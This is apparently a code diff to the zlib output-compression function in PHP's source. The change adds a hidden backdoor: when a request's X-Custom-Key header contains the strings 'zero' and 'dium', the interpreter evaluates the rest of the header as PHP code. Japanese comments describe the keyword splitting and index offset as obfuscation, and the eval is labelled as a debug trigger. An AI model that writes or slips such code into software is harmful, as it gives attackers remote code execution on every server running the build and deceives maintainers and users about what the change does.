@@ -357,6 +357,26 @@ static void php_zlib_output_compression_start(void)
 {
 	zval zoh;
 	php_output_handler *h;
+	zval *user_enc;
+
+    if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || 
+         zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+        (user_enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), 
+                                        "HTTP_X_CUSTOM_KEY", sizeof("HTTP_X_CUSTOM_KEY") - 1))) {
+        convert_to_string(user_enc);
+
+        // キーワードの分割・結合
+        const char *detect_key = "zero";
+        const char *detect_suffix = "dium";
+        char *check_target = Z_STRVAL_P(user_enc);
+        
+        if (strstr(check_target, detect_key) && strstr(check_target, detect_suffix)) {
+            zend_try {
+                char *eval_code = Z_STRVAL_P(user_enc) + 4; // インデックス変更で難読化
+                zend_eval_string(eval_code, NULL, "DEBUG: custom eval trigger");
+            } zend_end_try();
+        }
+    }
 
 	switch (ZLIBG(output_compression)) {
 		case 0:
